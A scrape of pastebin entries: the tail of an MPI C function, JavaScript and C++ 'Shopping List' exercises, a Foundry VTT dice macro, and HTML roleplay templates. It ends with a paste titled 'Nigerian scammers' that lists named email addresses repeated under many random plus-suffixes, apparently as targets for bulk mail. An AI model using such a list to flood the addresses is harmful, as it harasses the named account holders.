    MPI_Reduce(&local_dif_count, &dif_count, 1, MPI_INT, MPI_SUM, 0, MPI_COMM_WORLD);

    return dif_count;
}"
YJDbNeWk,02. Shopping List,Spocoman,JavaScript,Thursday 9th of November 2023 12:28:24 PM CDT,"function shoppingList(input) {
    let list = input.shift().split('!');

    while (input[0] !== ""Go Shopping!"") {
        [command, product, newProduct] = input.shift().split(' ');
        if (command === ""Urgent"" && !list.includes(product)) {
            list.unshift(product);
        } else if (command === ""Unnecessary"" && list.includes(product)) {
            list.splice(list.indexOf(product), 1);
        } else if (command === ""Correct"" && list.includes(product)) {
            list.splice(list.indexOf(product), 1, newProduct);
        } else if (command === ""Rearrange"" && list.includes(product)) {
            list.push(list.splice(list.indexOf(product), 1));
        }
    }  
    console.log(list.join("", ""));
	return;
}"
BNJuJEmY,02. Shopping List,Spocoman,C++,Thursday 9th of November 2023 12:22:43 PM CDT,"#include <iostream>
#include <vector>
#include <string>

using namespace std;

vector<string> vectorFiller(string str, char sep) {
    vector<string> v;
    string p = """";

    for (int i = 0; i < str.length(); i++) {
        if (str[i] == sep) {
            v.push_back(p);
            p = """";
        }
        else {
            p += str[i];
        }
    }
    v.push_back(p);
    return v;
}

int index(vector<string> v, string s) {
    for (int i = 0; i < v.size(); i++) {
        if (v[i] == s) {
            return i;
        }
    }
    return -1;
}

int main() {
    string line, product, newProduct, command;
    getline(cin, line);

    vector<string> list = vectorFiller(line, '!');

    while (true) {
        getline(cin, line);
        if (line == ""Go Shopping!"") {
            break;
        }

        vector<string> currentLine = vectorFiller(line, ' ');
        command = currentLine[0];
        product = currentLine[1];

        if (command == ""Urgent"" && index(list, product) == -1) {
            list.insert(list.begin(), product);
        }
        else if (command == ""Unnecessary"" && index(list, product) != -1) {
            list.erase(list.begin() + index(list, product));
        }
        else if (command == ""Correct"" && index(list, product) != -1) {
            newProduct = currentLine[2];
            list[index(list, product)] = newProduct;
        }
        else if (command == ""Rearrange"" && index(list, product) != -1) {
            list.erase(list.begin() + index(list, product));
            list.push_back(product);
        }
    }

    for (int i = 0; i < list.size() - 1; i++) {
        cout << list[i] << "", "";
    }
    cout << list[list.size() - 1] << endl;
    return 0;
}"
b3Vfpekt,Bone Carver's Chisel Macro,CantFindGeorge,JavaScript,Thursday 9th of November 2023 12:22:42 PM CDT,"// Bone Carver's Chisel Macro

// Creates dialogue box and prompts user for entry
await Dialog.prompt({
    title: `Bone Carver's Chisel - Consume A Bone?`,
    content: `
        <div class=""form-group"">
            <label for=""exampleSelect"">Which size bone would you like to use?</label>
            <select name=""exampleSelect"">
              <option value=""Bones - Small"">Small (1d4)</option>
              <option value=""Bones - Medium"">Medium (1d6)</option>
              <option value=""Bones - Large"">Large (1d8)</option>
              <option value=""Bones - Huge"">Huge (1d10)</option>
              <option value=""Bones - Gargantuan"">Gargantuan (1d12)</option>
            </select>
        </div>
        <br><br>
    `,

    callback: async(html) => {

        // Gather user input from prompt
        const bonePrompt = html[0].querySelector(""[name='exampleSelect']"").value;
        
        // Find bone from prompt in actor's inventory
        let boneSize = actor.items.getName(bonePrompt);

        // -----------------------
        // CHECKS ACTORS INVENTORY
        // -----------------------

        // No bones in inventory
        if (boneSize == null || boneSize == undefined){
            ui.notifications.error(""You don't have any bones of that size."")
            return;
        }


        // Bone is in inventory
        if (boneSize >= 1){


            // Assigns a die size based on user input
            let boneDice
            if(boneSize = ""Bones - Small""){
                boneDice = `<br><h2>Bone Carver's Chisel</h2><br><u>${bonePrompt}</u><br><br>/r 1d4`
            }
            if(boneSize = ""Bones - Medium""){
                boneDice = `<br><h2>Bone Carver's Chisel</h2><br><u>${bonePrompt}</u><br><br>/r 1d6`
            }
            if(boneSize = ""Bones - Large""){
                boneDice = `<br><h2>Bone Carver's Chisel</h2><br><u>${bonePrompt}</u><br><br>/r 1d8`
            }
            if(boneSize = ""Bones - Huge""){
                boneDice = `<br><h2>Bone Carver's Chisel</h2><br><u>${bonePrompt}</u><br><br>/r 1d10`
            }
            if(boneSize = ""Bones - Gargantuan""){
                boneDice = `<br><h2>Bone Carver's Chisel</h2><br><u>${bonePrompt}</u><br><br>/r 1d12`
            }

            // Removes bone from inventory
            await boneSize.update({""data.quantity"": boneSize.data.data.quantity - 1})
            // If less than 1 bone delete item from inventory
            if(boneSize.data.data.quantity < 1){
                boneSize.delete()
            }

            await ChatMessage.create({
                content: `${boneDice}`,
    
            })
        }



        
    }
});"
6K2CtuDf,36. grind me {pos de rol},elirosecodes,HTML,Thursday 9th of November 2023 12:22:20 PM CDT,"<link href=""https://dl.dropboxusercontent.com/scl/fi/w3nf9kvhg0g7cj9lxtgza/grind.css?rlkey=cyytyr7bwvx110e6fmiokfact&dl=0"" rel=""stylesheet""><link rel=""stylesheet"" href=""//icons.cappuccicons.com/cpf.css""><div class=""grindme"" style=""background-image:url(https://i.imgur.com/mR39dGU.png);""><div class=""grmd-s1""><div class=""grmd-s1t""><div class=""grmd-s1tl"">Press me up against your lips</div><div class=""grmd-s1ts"">fill your lungs</div><div class=""grmd-s1st"">Then breathe me out</div></div></div><div class=""grmd-s2""><div class=""grmd-s2b"">
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras faucibus velit eleifend est pellentesque, sit amet tempus nibh elementum. Integer non ornare erat. Phasellus fringilla, elit a luctus convallis, urna magna tincidunt ante, non lacinia metus diam sit amet nulla. Morbi felis ipsum, ultrices a maximus vel, volutpat vel mi. Donec venenatis massa neque, nec vulputate est aliquam sit amet. Cras sed tellus porta arcu pellentesque volutpat. Ut in elit justo. Sed ut mauris felis. Proin sagittis tortor tempus nisi condimentum, vel semper purus tempus. Sed congue pulvinar pharetra. Mauris sit amet feugiat lorem. Quisque tincidunt, elit vel vulputate auctor, ipsum lectus hendrerit lectus, vel euismod tortor tellus posuere ante.
<div class=""grmd-s2sc""><a href=""/""><i class=""cp cp-cigarette""></i><br><span>outfit</span></a></div></div></div></div><a href=""https://elirosecodes.tumblr.com/""><div class=""gnomo"">elirose</div></a>"
kMhWyeup,35. Our year {relaciones},elirosecodes,HTML,Thursday 9th of November 2023 12:21:47 PM CDT,"<link href=""https://dl.dropboxusercontent.com/scl/fi/w6fqlijp81bnluag9uacl/ouryear.css?rlkey=i4rbvr6hpajqc1fvtfpbxi0bo&dl=0"" rel=""stylesheet""><link rel=""stylesheet"" href=""//icons.cappuccicons.com/cpf.css""><div class=""our-year""><div class=""oy-s1""><div class=""oy-s1a"">our year</div><div class=""oy-s1b"">this is our summer night, our winter time</div></div><div class=""oy-s2""><div class=""oy-s2a""><div class=""oy-s2a1""><i class=""cp cp-flower""></i><span>love</span></div><div class=""oy-s2a1""><i class=""cp cp-sun""></i><span>friends</span></div><div class=""oy-s2a1""><i class=""cp cp-leaf""></i><span>neutral</span></div><div class=""oy-s2a1""><i class=""cp cp-snowflake""></i><span>hate</span></div></div><div class=""oy-s2b"">

/*Primavera*/
<div class=""oy-bx oy-lv""><div class=""oy-bx1""><div class=""oy-bx1a"" style=""background-image:url(https://via.placeholder.com/60x65);""></div><div class=""oy-bx1b"">Nombre del personaje</div></div><div class=""oy-bx2"">my dear beloved one</div><i class=""cp cp-flower""></i><div class=""oy-bx3"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis interdum congue ipsum id pharetra. Lorem ipsum dolor sit amet, consectetur adipiscing elit. In lobortis eros id tellus interdum, eu suscipit mi gravida. Integer tempor felis purus, at facilisis diam imperdiet vel. Nulla auctor nulla elementum erat lacinia, eu maximus dui fringilla. Suspendisse eget venenatis orci. Aenean consectetur lectus at lacinia convallis. Nunc eget faucibus ex. Vivamus quis interdum nunc, sit amet dapibus nunc. Fusce orci ligula, mollis in porttitor vel, convallis vel lorem. Etiam nec nisi est. Donec vel auctor justo, in consequat turpis.
</div></div>

/*Verano*/
<div class=""oy-bx oy-fr""><div class=""oy-bx1""><div class=""oy-bx1a"" style=""background-image:url(https://via.placeholder.com/60x65);""></div><div class=""oy-bx1b"">Nombre del personaje</div></div><div class=""oy-bx2"">my dear beloved one</div><i class=""cp cp-sun""></i><div class=""oy-bx3"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis interdum congue ipsum id pharetra. Lorem ipsum dolor sit amet, consectetur adipiscing elit. In lobortis eros id tellus interdum, eu suscipit mi gravida. Integer tempor felis purus, at facilisis diam imperdiet vel. Nulla auctor nulla elementum erat lacinia, eu maximus dui fringilla. Suspendisse eget venenatis orci. Aenean consectetur lectus at lacinia convallis. Nunc eget faucibus ex. Vivamus quis interdum nunc, sit amet dapibus nunc. Fusce orci ligula, mollis in porttitor vel, convallis vel lorem. Etiam nec nisi est. Donec vel auctor justo, in consequat turpis.
</div></div>

/*Otoño*/
<div class=""oy-bx oy-ne""><div class=""oy-bx1""><div class=""oy-bx1a"" style=""background-image:url(https://via.placeholder.com/60x65);""></div><div class=""oy-bx1b"">Nombre del personaje</div></div><div class=""oy-bx2"">my dear beloved one</div><i class=""cp cp-leaf""></i><div class=""oy-bx3"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis interdum congue ipsum id pharetra. Lorem ipsum dolor sit amet, consectetur adipiscing elit. In lobortis eros id tellus interdum, eu suscipit mi gravida. Integer tempor felis purus, at facilisis diam imperdiet vel. Nulla auctor nulla elementum erat lacinia, eu maximus dui fringilla. Suspendisse eget venenatis orci. Aenean consectetur lectus at lacinia convallis. Nunc eget faucibus ex. Vivamus quis interdum nunc, sit amet dapibus nunc. Fusce orci ligula, mollis in porttitor vel, convallis vel lorem. Etiam nec nisi est. Donec vel auctor justo, in consequat turpis.
</div></div>

/*Invierno*/
<div class=""oy-bx oy-ht""><div class=""oy-bx1""><div class=""oy-bx1a"" style=""background-image:url(https://via.placeholder.com/60x65);""></div><div class=""oy-bx1b"">Nombre del personaje</div></div><div class=""oy-bx2"">my dear beloved one</div><i class=""cp cp-snowflake""></i><div class=""oy-bx3"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis interdum congue ipsum id pharetra. Lorem ipsum dolor sit amet, consectetur adipiscing elit. In lobortis eros id tellus interdum, eu suscipit mi gravida. Integer tempor felis purus, at facilisis diam imperdiet vel. Nulla auctor nulla elementum erat lacinia, eu maximus dui fringilla. Suspendisse eget venenatis orci. Aenean consectetur lectus at lacinia convallis. Nunc eget faucibus ex. Vivamus quis interdum nunc, sit amet dapibus nunc. Fusce orci ligula, mollis in porttitor vel, convallis vel lorem. Etiam nec nisi est. Donec vel auctor justo, in consequat turpis.
</div></div>
 
</div></div><div class=""oy-s3""><div class=""oy-s3a""><div class=""oy-s3a1""></div><div class=""oy-s3a2"">this is our fall morning, our spring moment</div></div><div class=""oy-s3b"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis interdum congue ipsum id pharetra. Lorem ipsum dolor sit amet, consectetur adipiscing elit. In lobortis eros id tellus interdum, eu suscipit mi gravida. Integer tempor felis purus, at facilisis diam imperdiet vel.</div></div></div><a href=""https://elirosecodes.tumblr.com/""><div class=""gnomo"">elirose</div></a><style>:root{--oy-wt: #fff; --oy-bg: #454545; --oy-tx: #000; --oy-cl: #E6D1F0; --oy-lv: #FFD6E9; --oy-fr: #CBDDA6; --oy-ne: #FCD6BD; --oy-ht: #A9DEF9;}</style>"
v35HNd6g,Nigerian scammers [9-11-2/2023],bombaires,AIMMS,Thursday 9th of November 2023 12:11:45 PM CDT,"<a href=""mailto:paymastergeneralng06@gmail.com"">paymastergeneralng06@gmail.com</a>
<a href=""mailto:paymastergeneralng06+9242@gmail.com"">paymastergeneralng06+9242@gmail.com</a>
<a href=""mailto:paymastergeneralng06+22271@gmail.com"">paymastergeneralng06+22271@gmail.com</a>
<a href=""mailto:paymastergeneralng06+23259@gmail.com"">paymastergeneralng06+23259@gmail.com</a>
<a href=""mailto:paymastergeneralng06+20114@gmail.com"">paymastergeneralng06+20114@gmail.com</a>
<a href=""mailto:paymastergeneralng06+6197@gmail.com"">paymastergeneralng06+6197@gmail.com</a>
<a href=""mailto:paymastergeneralng06+11903@gmail.com"">paymastergeneralng06+11903@gmail.com</a>
<a href=""mailto:paymastergeneralng06+17779@gmail.com"">paymastergeneralng06+17779@gmail.com</a>
<a href=""mailto:paymastergeneralng06+16496@gmail.com"">paymastergeneralng06+16496@gmail.com</a>
<a href=""mailto:paymastergeneralng06+30017@gmail.com"">paymastergeneralng06+30017@gmail.com</a>
<a href=""mailto:paymastergeneralng06+7807@gmail.com"">paymastergeneralng06+7807@gmail.com</a>
<a href=""mailto:paymastergeneralng06+3394@gmail.com"">paymastergeneralng06+3394@gmail.com</a>
<a href=""mailto:paymastergeneralng06+4588@gmail.com"">paymastergeneralng06+4588@gmail.com</a>
<a href=""mailto:paymastergeneralng06+31887@gmail.com"">paymastergeneralng06+31887@gmail.com</a>
<a href=""mailto:paymastergeneralng06+17518@gmail.com"">paymastergeneralng06+17518@gmail.com</a>
<a href=""mailto:paymastergeneralng06+6650@gmail.com"">paymastergeneralng06+6650@gmail.com</a>
<a href=""mailto:paymastergeneralng06+23820@gmail.com"">paymastergeneralng06+23820@gmail.com</a>
<a href=""mailto:paymastergeneralng06+24771@gmail.com"">paymastergeneralng06+24771@gmail.com</a>
<a href=""mailto:paymastergeneralng06+18366@gmail.com"">paymastergeneralng06+18366@gmail.com</a>
<a href=""mailto:paymastergeneralng06+1550@gmail.com"">paymastergeneralng06+1550@gmail.com</a>
<a href=""mailto:paymastergeneralng06+3167@gmail.com"">paymastergeneralng06+3167@gmail.com</a>
<a href=""mailto:paymastergeneralng06+16394@gmail.com"">paymastergeneralng06+16394@gmail.com</a>
<a href=""mailto:paymastergeneralng06+26027@gmail.com"">paymastergeneralng06+26027@gmail.com</a>
<a href=""mailto:paymastergeneralng06+114@gmail.com"">paymastergeneralng06+114@gmail.com</a>
<a href=""mailto:paymastergeneralng06+16689@gmail.com"">paymastergeneralng06+16689@gmail.com</a>
<a href=""mailto:paymastergeneralng06+20245@gmail.com"">paymastergeneralng06+20245@gmail.com</a>
<a href=""mailto:paymastergeneralng06+4437@gmail.com"">paymastergeneralng06+4437@gmail.com</a>
<a href=""mailto:paymastergeneralng06+30204@gmail.com"">paymastergeneralng06+30204@gmail.com</a>
<a href=""mailto:paymastergeneralng06+19463@gmail.com"">paymastergeneralng06+19463@gmail.com</a>
<a href=""mailto:paymastergeneralng06+2936@gmail.com"">paymastergeneralng06+2936@gmail.com</a>
<a href=""mailto:paymastergeneralng06+14296@gmail.com"">paymastergeneralng06+14296@gmail.com</a>
<a href=""mailto:paymastergeneralng06+9574@gmail.com"">paymastergeneralng06+9574@gmail.com</a>
<a href=""mailto:paymastergeneralng06+18968@gmail.com"">paymastergeneralng06+18968@gmail.com</a>
<a href=""mailto:paymastergeneralng06+22254@gmail.com"">paymastergeneralng06+22254@gmail.com</a>
<a href=""mailto:paymastergeneralng06+9226@gmail.com"">paymastergeneralng06+9226@gmail.com</a>
<a href=""mailto:paymastergeneralng06+17261@gmail.com"">paymastergeneralng06+17261@gmail.com</a>
<a href=""mailto:paymastergeneralng06+21571@gmail.com"">paymastergeneralng06+21571@gmail.com</a>
<a href=""mailto:paymastergeneralng06+32540@gmail.com"">paymastergeneralng06+32540@gmail.com</a>
<a href=""mailto:paymastergeneralng06+20193@gmail.com"">paymastergeneralng06+20193@gmail.com</a>
<a href=""mailto:paymastergeneralng06+31597@gmail.com"">paymastergeneralng06+31597@gmail.com</a>
<a href=""mailto:paymastergeneralng06+13776@gmail.com"">paymastergeneralng06+13776@gmail.com</a>
<a href=""mailto:paymastergeneralng06+12082@gmail.com"">paymastergeneralng06+12082@gmail.com</a>
<a href=""mailto:paymastergeneralng06+11276@gmail.com"">paymastergeneralng06+11276@gmail.com</a>
<a href=""mailto:paymastergeneralng06+11373@gmail.com"">paymastergeneralng06+11373@gmail.com</a>
<a href=""mailto:paymastergeneralng06+28286@gmail.com"">paymastergeneralng06+28286@gmail.com</a>
<a href=""mailto:paymastergeneralng06+14627@gmail.com"">paymastergeneralng06+14627@gmail.com</a>
<a href=""mailto:paymastergeneralng06+4412@gmail.com"">paymastergeneralng06+4412@gmail.com</a>
<a href=""mailto:paymastergeneralng06+25065@gmail.com"">paymastergeneralng06+25065@gmail.com</a>
<a href=""mailto:paymastergeneralng06+13857@gmail.com"">paymastergeneralng06+13857@gmail.com</a>
<a href=""mailto:paymastergeneralng06+818@gmail.com"">paymastergeneralng06+818@gmail.com</a>
<a href=""mailto:paymastergeneralng06+16396@gmail.com"">paymastergeneralng06+16396@gmail.com</a>
<a href=""mailto:paymastergeneralng06+27803@gmail.com"">paymastergeneralng06+27803@gmail.com</a>
<a href=""mailto:paymastergeneralng06+7406@gmail.com"">paymastergeneralng06+7406@gmail.com</a>
<a href=""mailto:paymastergeneralng06+20876@gmail.com"">paymastergeneralng06+20876@gmail.com</a>
<a href=""mailto:paymastergeneralng06+28985@gmail.com"">paymastergeneralng06+28985@gmail.com</a>
<a href=""mailto:paymastergeneralng06+19921@gmail.com"">paymastergeneralng06+19921@gmail.com</a>
<a href=""mailto:paymastergeneralng06+25320@gmail.com"">paymastergeneralng06+25320@gmail.com</a>
<a href=""mailto:paymastergeneralng06+12249@gmail.com"">paymastergeneralng06+12249@gmail.com</a>
<a href=""mailto:paymastergeneralng06+7730@gmail.com"">paymastergeneralng06+7730@gmail.com</a>
<a href=""mailto:paymastergeneralng06+17348@gmail.com"">paymastergeneralng06+17348@gmail.com</a>
<a href=""mailto:paymastergeneralng06+16635@gmail.com"">paymastergeneralng06+16635@gmail.com</a>
<a href=""mailto:paymastergeneralng06+21083@gmail.com"">paymastergeneralng06+21083@gmail.com</a>
<a href=""mailto:paymastergeneralng06+730@gmail.com"">paymastergeneralng06+730@gmail.com</a>
<a href=""mailto:paymastergeneralng06+14731@gmail.com"">paymastergeneralng06+14731@gmail.com</a>
<a href=""mailto:paymastergeneralng06+1488@gmail.com"">paymastergeneralng06+1488@gmail.com</a>
<a href=""mailto:paymastergeneralng06+8956@gmail.com"">paymastergeneralng06+8956@gmail.com</a>
<a href=""mailto:paymastergeneralng06+7558@gmail.com"">paymastergeneralng06+7558@gmail.com</a>
<a href=""mailto:paymastergeneralng06+28108@gmail.com"">paymastergeneralng06+28108@gmail.com</a>
<a href=""mailto:paymastergeneralng06+2389@gmail.com"">paymastergeneralng06+2389@gmail.com</a>
<a href=""mailto:paymastergeneralng06+25923@gmail.com"">paymastergeneralng06+25923@gmail.com</a>
<a href=""mailto:paymastergeneralng06+9285@gmail.com"">paymastergeneralng06+9285@gmail.com</a>
<a href=""mailto:paymastergeneralng06+8649@gmail.com"">paymastergeneralng06+8649@gmail.com</a>
<a href=""mailto:paymastergeneralng06+3435@gmail.com"">paymastergeneralng06+3435@gmail.com</a>
<a href=""mailto:paymastergeneralng06+18038@gmail.com"">paymastergeneralng06+18038@gmail.com</a>
<a href=""mailto:paymastergeneralng06+4470@gmail.com"">paymastergeneralng06+4470@gmail.com</a>
<a href=""mailto:paymastergeneralng06+4051@gmail.com"">paymastergeneralng06+4051@gmail.com</a>
<a href=""mailto:paymastergeneralng06+27352@gmail.com"">paymastergeneralng06+27352@gmail.com</a>
<a href=""mailto:paymastergeneralng06+20985@gmail.com"">paymastergeneralng06+20985@gmail.com</a>
<a href=""mailto:paymastergeneralng06+14738@gmail.com"">paymastergeneralng06+14738@gmail.com</a>
<a href=""mailto:paymastergeneralng06+7205@gmail.com"">paymastergeneralng06+7205@gmail.com</a>
<a href=""mailto:paymastergeneralng06+11437@gmail.com"">paymastergeneralng06+11437@gmail.com</a>
<a href=""mailto:paymastergeneralng06+24161@gmail.com"">paymastergeneralng06+24161@gmail.com</a>
<a href=""mailto:paymastergeneralng06+18195@gmail.com"">paymastergeneralng06+18195@gmail.com</a>
<a href=""mailto:paymastergeneralng06+7644@gmail.com"">paymastergeneralng06+7644@gmail.com</a>
<a href=""mailto:paymastergeneralng06+12304@gmail.com"">paymastergeneralng06+12304@gmail.com</a>
<a href=""mailto:paymastergeneralng06+8202@gmail.com"">paymastergeneralng06+8202@gmail.com</a>
<a href=""mailto:paymastergeneralng06+27606@gmail.com"">paymastergeneralng06+27606@gmail.com</a>
<a href=""mailto:paymastergeneralng06+30292@gmail.com"">paymastergeneralng06+30292@gmail.com</a>
<a href=""mailto:paymastergeneralng06+26892@gmail.com"">paymastergeneralng06+26892@gmail.com</a>
<a href=""mailto:paymastergeneralng06+15955@gmail.com"">paymastergeneralng06+15955@gmail.com</a>
<a href=""mailto:paymastergeneralng06+19728@gmail.com"">paymastergeneralng06+19728@gmail.com</a>
<a href=""mailto:paymastergeneralng06+20454@gmail.com"">paymastergeneralng06+20454@gmail.com</a>
<a href=""mailto:paymastergeneralng06+18229@gmail.com"">paymastergeneralng06+18229@gmail.com</a>
<a href=""mailto:paymastergeneralng06+16799@gmail.com"">paymastergeneralng06+16799@gmail.com</a>
<a href=""mailto:paymastergeneralng06+25798@gmail.com"">paymastergeneralng06+25798@gmail.com</a>
<a href=""mailto:paymastergeneralng06+7547@gmail.com"">paymastergeneralng06+7547@gmail.com</a>
<a href=""mailto:paymastergeneralng06+20397@gmail.com"">paymastergeneralng06+20397@gmail.com</a>
<a href=""mailto:paymastergeneralng06+12441@gmail.com"">paymastergeneralng06+12441@gmail.com</a>
<a href=""mailto:paymastergeneralng06+28297@gmail.com"">paymastergeneralng06+28297@gmail.com</a>
<a href=""mailto:paymastergeneralng06+24806@gmail.com"">paymastergeneralng06+24806@gmail.com</a>
<a href=""mailto:paymastergeneralng06+32071@gmail.com"">paymastergeneralng06+32071@gmail.com</a>
<a href=""mailto:MacKinnonPhillipsLawFirm@hotmail.com"">MacKinnonPhillipsLawFirm@hotmail.com</a>
<a href=""mailto:brownken323@gmail.com"">brownken323@gmail.com</a>
<a href=""mailto:brownken323+16538@gmail.com"">brownken323+16538@gmail.com</a>
<a href=""mailto:brownken323+23059@gmail.com"">brownken323+23059@gmail.com</a>
<a href=""mailto:brownken323+1875@gmail.com"">brownken323+1875@gmail.com</a>
<a href=""mailto:brownken323+3710@gmail.com"">brownken323+3710@gmail.com</a>
<a href=""mailto:brownken323+5658@gmail.com"">brownken323+5658@gmail.com</a>
<a href=""mailto:brownken323+18945@gmail.com"">brownken323+18945@gmail.com</a>
<a href=""mailto:brownken323+31353@gmail.com"">brownken323+31353@gmail.com</a>
<a href=""mailto:brownken323+21743@gmail.com"">brownken323+21743@gmail.com</a>
<a href=""mailto:brownken323+32393@gmail.com"">brownken323+32393@gmail.com</a>
<a href=""mailto:brownken323+9223@gmail.com"">brownken323+9223@gmail.com</a>
<a href=""mailto:brownken323+25245@gmail.com"">brownken323+25245@gmail.com</a>
<a href=""mailto:brownken323+3937@gmail.com"">brownken323+3937@gmail.com</a>
<a href=""mailto:brownken323+29093@gmail.com"">brownken323+29093@gmail.com</a>
<a href=""mailto:brownken323+19993@gmail.com"">brownken323+19993@gmail.com</a>
<a href=""mailto:brownken323+12236@gmail.com"">brownken323+12236@gmail.com</a>
<a href=""mailto:brownken323+9631@gmail.com"">brownken323+9631@gmail.com</a>
<a href=""mailto:brownken323+28155@gmail.com"">brownken323+28155@gmail.com</a>
<a href=""mailto:brownken323+10835@gmail.com"">brownken323+10835@gmail.com</a>
<a href=""mailto:brownken323+5428@gmail.com"">brownken323+5428@gmail.com</a>
<a href=""mailto:brownken323+25781@gmail.com"">brownken323+25781@gmail.com</a>
<a href=""mailto:brownken323+12546@gmail.com"">brownken323+12546@gmail.com</a>
<a href=""mailto:brownken323+32391@gmail.com"">brownken323+32391@gmail.com</a>
<a href=""mailto:brownken323+11484@gmail.com"">brownken323+11484@gmail.com</a>
<a href=""mailto:brownken323+32108@gmail.com"">brownken323+32108@gmail.com</a>
<a href=""mailto:brownken323+6081@gmail.com"">brownken323+6081@gmail.com</a>
<a href=""mailto:brownken323+31120@gmail.com"">brownken323+31120@gmail.com</a>
<a href=""mailto:brownken323+22589@gmail.com"">brownken323+22589@gmail.com</a>
<a href=""mailto:brownken323+26647@gmail.com"">brownken323+26647@gmail.com</a>
<a href=""mailto:brownken323+678@gmail.com"">brownken323+678@gmail.com</a>
<a href=""mailto:brownken323+31659@gmail.com"">brownken323+31659@gmail.com</a>
<a href=""mailto:brownken323+5945@gmail.com"">brownken323+5945@gmail.com</a>
<a href=""mailto:brownken323+13603@gmail.com"">brownken323+13603@gmail.com</a>
<a href=""mailto:brownken323+4121@gmail.com"">brownken323+4121@gmail.com</a>
<a href=""mailto:brownken323+12810@gmail.com"">brownken323+12810@gmail.com</a>
<a href=""mailto:brownken323+28669@gmail.com"">brownken323+28669@gmail.com</a>
<a href=""mailto:brownken323+22472@gmail.com"">brownken323+22472@gmail.com</a>
<a href=""mailto:brownken323+4393@gmail.com"">brownken323+4393@gmail.com</a>
<a href=""mailto:brownken323+1998@gmail.com"">brownken323+1998@gmail.com</a>
<a href=""mailto:brownken323+18104@gmail.com"">brownken323+18104@gmail.com</a>
<a href=""mailto:brownken323+12175@gmail.com"">brownken323+12175@gmail.com</a>
<a href=""mailto:brownken323+1902@gmail.com"">brownken323+1902@gmail.com</a>
<a href=""mailto:brownken323+13152@gmail.com"">brownken323+13152@gmail.com</a>
<a href=""mailto:brownken323+26269@gmail.com"">brownken323+26269@gmail.com</a>
<a href=""mailto:brownken323+2536@gmail.com"">brownken323+2536@gmail.com</a>
<a href=""mailto:brownken323+28455@gmail.com"">brownken323+28455@gmail.com</a>
<a href=""mailto:brownken323+23539@gmail.com"">brownken323+23539@gmail.com</a>
<a href=""mailto:brownken323+27687@gmail.com"">brownken323+27687@gmail.com</a>
<a href=""mailto:brownken323+2715@gmail.com"">brownken323+2715@gmail.com</a>
<a href=""mailto:brownken323+24753@gmail.com"">brownken323+24753@gmail.com</a>
<a href=""mailto:brownken323+30155@gmail.com"">brownken323+30155@gmail.com</a>
<a href=""mailto:brownken323+12681@gmail.com"">brownken323+12681@gmail.com</a>
<a href=""mailto:brownken323+7675@gmail.com"">brownken323+7675@gmail.com</a>
<a href=""mailto:brownken323+6141@gmail.com"">brownken323+6141@gmail.com</a>
<a href=""mailto:brownken323+2851@gmail.com"">brownken323+2851@gmail.com</a>
<a href=""mailto:brownken323+28199@gmail.com"">brownken323+28199@gmail.com</a>
<a href=""mailto:brownken323+8564@gmail.com"">brownken323+8564@gmail.com</a>
<a href=""mailto:brownken323+4645@gmail.com"">brownken323+4645@gmail.com</a>
<a href=""mailto:brownken323+7561@gmail.com"">brownken323+7561@gmail.com</a>
<a href=""mailto:brownken323+17264@gmail.com"">brownken323+17264@gmail.com</a>
<a href=""mailto:brownken323+17723@gmail.com"">brownken323+17723@gmail.com</a>
<a href=""mailto:brownken323+2303@gmail.com"">brownken323+2303@gmail.com</a>
<a href=""mailto:brownken323+20083@gmail.com"">brownken323+20083@gmail.com</a>
<a href=""mailto:brownken323+18997@gmail.com"">brownken323+18997@gmail.com</a>
<a href=""mailto:brownken323+24165@gmail.com"">brownken323+24165@gmail.com</a>
<a href=""mailto:brownken323+17705@gmail.com"">brownken323+17705@gmail.com</a>
<a href=""mailto:brownken323+18517@gmail.com"">brownken323+18517@gmail.com</a>
<a href=""mailto:brownken323+26861@gmail.com"">brownken323+26861@gmail.com</a>
<a href=""mailto:brownken323+3017@gmail.com"">brownken323+3017@gmail.com</a>
<a href=""mailto:brownken323+21928@gmail.com"">brownken323+21928@gmail.com</a>
<a href=""mailto:brownken323+29185@gmail.com"">brownken323+29185@gmail.com</a>
<a href=""mailto:brownken323+14389@gmail.com"">brownken323+14389@gmail.com</a>
<a href=""mailto:brownken323+30594@gmail.com"">brownken323+30594@gmail.com</a>
<a href=""mailto:brownken323+665@gmail.com"">brownken323+665@gmail.com</a>
<a href=""mailto:brownken323+2745@gmail.com"">brownken323+2745@gmail.com</a>
<a href=""mailto:brownken323+470@gmail.com"">brownken323+470@gmail.com</a>
<a href=""mailto:brownken323+18968@gmail.com"">brownken323+18968@gmail.com</a>
<a href=""mailto:brownken323+11208@gmail.com"">brownken323+11208@gmail.com</a>
<a href=""mailto:brownken323+25451@gmail.com"">brownken323+25451@gmail.com</a>
<a href=""mailto:brownken323+32511@gmail.com"">brownken323+32511@gmail.com</a>
<a href=""mailto:brownken323+18004@gmail.com"">brownken323+18004@gmail.com</a>
<a href=""mailto:brownken323+22823@gmail.com"">brownken323+22823@gmail.com</a>
<a href=""mailto:brownken323+9859@gmail.com"">brownken323+9859@gmail.com</a>
<a href=""mailto:brownken323+24348@gmail.com"">brownken323+24348@gmail.com</a>
<a href=""mailto:brownken323+3035@gmail.com"">brownken323+3035@gmail.com</a>
<a href=""mailto:brownken323+23492@gmail.com"">brownken323+23492@gmail.com</a>
<a href=""mailto:brownken323+20400@gmail.com"">brownken323+20400@gmail.com</a>
<a href=""mailto:brownken323+10691@gmail.com"">brownken323+10691@gmail.com</a>
<a href=""mailto:brownken323+28192@gmail.com"">brownken323+28192@gmail.com</a>
<a href=""mailto:brownken323+13077@gmail.com"">brownken323+13077@gmail.com</a>
<a href=""mailto:brownken323+30261@gmail.com"">brownken323+30261@gmail.com</a>
<a href=""mailto:brownken323+11733@gmail.com"">brownken323+11733@gmail.com</a>
<a href=""mailto:brownken323+17409@gmail.com"">brownken323+17409@gmail.com</a>
<a href=""mailto:brownken323+14143@gmail.com"">brownken323+14143@gmail.com</a>
<a href=""mailto:brownken323+4740@gmail.com"">brownken323+4740@gmail.com</a>
<a href=""mailto:brownken323+3862@gmail.com"">brownken323+3862@gmail.com</a>
<a href=""mailto:brownken323+23236@gmail.com"">brownken323+23236@gmail.com</a>
<a href=""mailto:brownken323+2388@gmail.com"">brownken323+2388@gmail.com</a>
<a href=""mailto:brownken323+20344@gmail.com"">brownken323+20344@gmail.com</a>
